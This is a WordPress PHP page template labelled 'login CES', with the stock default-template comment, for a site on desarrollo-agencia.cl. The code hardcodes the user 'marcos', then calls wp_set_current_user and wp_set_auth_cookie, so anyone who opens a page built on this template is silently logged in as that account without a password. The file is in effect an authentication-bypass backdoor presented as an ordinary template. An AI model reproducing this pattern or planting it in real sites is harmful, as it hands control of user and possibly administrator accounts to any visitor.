<?php
/**
 * Template name: login CES
 *
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site may use a
 * different template.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package craed_duoc_uc
 */

 $user_login = 'marcos';
 $current_site = array(
	"id" => 1 ,
	"domain" => "desarrollo-agencia.cl/" ,
	"path" => "/" ,
	"blog_id" => 1 ,
	"cookie_domain" => "desarrollo-agencia.cl/" ,
) ;
$current_blog = array(
	"blog_id" => "1" ,
	"site_id" => "1" ,
	"domain" => "blog.desarrollo-agencia.cl/" ,
	"path" => "/" ,
	"registered" => "2022-01-02 13:59:04" ,
	"last_updated" => "2022-03-02 13:59:09" ,
	"public" => "1" ,
	"archived" => "0" ,
	"mature" => "0" ,
	"spam" => "0" ,
	"deleted" => "0" ,
	"lang_id" => "0" ,
) ;
 $user = get_userdatabylogin($user_login);
 $user_id = $user->ID;
 wp_set_current_user($user_id, $user_login);
 wp_set_auth_cookie($user_id);

get_footer();